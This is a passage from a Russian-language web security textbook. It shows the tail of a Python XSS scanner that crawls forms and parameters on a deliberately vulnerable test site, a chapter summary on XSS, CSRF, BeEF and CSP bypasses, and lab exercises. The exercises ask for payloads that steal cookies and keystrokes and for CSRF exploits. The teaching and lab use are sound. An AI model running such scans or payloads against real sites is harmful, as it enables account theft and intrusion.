                    response = self.session.post(url, data=test_params, timeout=10)
                
                # Проверяем наличие payload в ответе
                if payload in response.text:
                    context = self._analyze_context(response.text, payload)
                    vulnerabilities.append((payload, context))
                    print(f"[!] УЯЗВИМОСТЬ! Параметр '{param}', payload: {payload[:50]}")
                    print(f"    Контекст: {context}")
                
                # Проверяем декодированные версии
                decoded = html.unescape(payload)
                if decoded != payload and decoded in response.text:
                    context = self._analyze_context(response.text, decoded)
                    vulnerabilities.append((payload, f"decoded: {context}"))
                
            except requests.RequestException as e:
                print(f"[-] Ошибка запроса: {e}")
        
        return vulnerabilities
    
    def _analyze_context(self, html_content: str, payload: str) -> str:
        """Определение контекста вставки payload"""
        idx = html_content.find(payload)
        if idx == -1:
            return "unknown"
        
        # Берём окружение
        before = html_content[max(0, idx-50):idx]
        after = html_content[idx+len(payload):idx+len(payload)+50]
        
        # Анализируем контекст
        if '<script' in before and '</script>' in after:
            return "javascript_block"
        elif 'value="' in before or "value='" in before:
            return "html_attribute_value"
        elif '<' in before[-5:] or '>' in after[:5]:
            return "html_tag_context"
        else:
            return f"html_text (before: {before[-20:]!r}, after: {after[:20]!r})"
    
    def crawl_and_test(self, max_urls: int = 50) -> dict:
        """
        Простой краулер + тестирование всех найденных параметров
        """
        results = {}
        
        # Начинаем с базового URL
        to_visit = [self.base_url]
        visited = set()
        
        while to_visit and len(visited) < max_urls:
            url = to_visit.pop(0)
            if url in visited:
                continue
            
            visited.add(url)
            
            try:
                response = self.session.get(url, timeout=10)
                
                # Ищем формы
                forms = self._extract_forms(response.text, url)
                for form in forms:
                    form_results = self._test_form(form)
                    if form_results:
                        results[url] = form_results
                
                # Ищем URL-параметры в ссылках
                links = re.findall(r'href=["\']([^"\']+)["\']', response.text)
                for link in links:
                    if '?' in link and link not in visited:
                        to_visit.append(link)
            
            except requests.RequestException:
                pass
        
        return results
    
    def _extract_forms(self, html_content: str, base_url: str) -> list:
        """Извлечение форм из HTML"""
        forms = []
        form_pattern = re.compile(
            r'<form[^>]*action=["\']?([^"\'> ]*)["\']?[^>]*>(.*?)</form>',
            re.DOTALL | re.IGNORECASE
        )
        input_pattern = re.compile(
            r'<input[^>]*name=["\']([^"\']+)["\'][^>]*>',
            re.IGNORECASE
        )
        
        for form_match in form_pattern.finditer(html_content):
            action = form_match.group(1) or base_url
            form_html = form_match.group(2)
            inputs = input_pattern.findall(form_html)
            
            forms.append({
                'action': action,
                'inputs': inputs
            })
        
        return forms
    
    def _test_form(self, form: dict) -> list:
        """Тестирование формы"""
        results = []
        for input_name in form['inputs']:
            vulns = self.test_parameter(
                form['action'],
                input_name,
                method='POST'
            )
            if vulns:
                results.extend(vulns)
        return results


if __name__ == '__main__':
    tester = XSSTester("http://testphp.vulnweb.com")
    
    # Тест конкретного параметра
    vulns = tester.test_parameter(
        "http://testphp.vulnweb.com/search.php",
        "searchFor"
    )
    
    if vulns:
        print(f"\n[+] Найдено {len(vulns)} уязвимостей XSS!")
    else:
        print("\n[-] Уязвимостей не обнаружено")
```

---

## Итоги главы

В этой главе мы изучили два важнейших класса клиентских атак:

1. **XSS**: три типа (Reflected, Stored, DOM-based), кражa куки и сессий, кейлоггеры
2. **BeEF**: профессиональный фреймворк для браузерных атак через XSS
3. **CSRF**: механика атаки, форм-based и fetch-based эксплоиты
4. **CSRF-токены**: правильная реализация и типичные ошибки
5. **SameSite cookies**: защита и обходы
6. **Content Security Policy**: настройка и типичные обходы
7. **Защита**: output encoding, DOMPurify, security headers

> **Важно:** XSS и CSRF часто цепочкой. XSS на том же домене полностью нивелирует защиту CSRF-токенов и SameSite cookies. Приоритизируйте устранение XSS как первоочерёдной угрозы.

---

## Практические задания

### Задание 1: XSS в DVWA
Эксплуатируйте все три типа XSS в DVWA на уровне High, задокументировав payload и обход фильтра.

### Задание 2: XSS с реальной кражей данных
Настройте XSS Catcher сервер и создайте payload, который:
- Крадёт все куки
- Перехватывает нажатия клавиш
- Снимает скриншот через Canvas API

### Zadanie 3: CSRF эксплоит
В лабораторных условиях (DVWA или WebGoat):
- Создайте HTML страницу с CSRF атакой
- Протестируйте смену пароля без ведома жертвы
- Попробуйте обойти CSRF-защиту через уязвимую реализацию токена

### Задание 4: CSP bypass
Используя https://csp-evaluator.withgoogle.com, оцените следующие CSP политики:
```
script-src 'self' 'unsafe-inline';
script-src 'self' https://cdn.jsdelivr.net;
script-src 'self' 'nonce-abc123';
```
Найдите обход для каждой.

### Задание 5: PortSwigger Labs
Пройдите следующие лабораторные работы PortSwigger Web Security Academy:
- "Reflected XSS into HTML context with nothing encoded"
- "Stored XSS into anchor href attribute with double quotes HTML-encoded"
- "DOM XSS in document.write sink using source location.search"
- "CSRF where token validation depends on token being present"
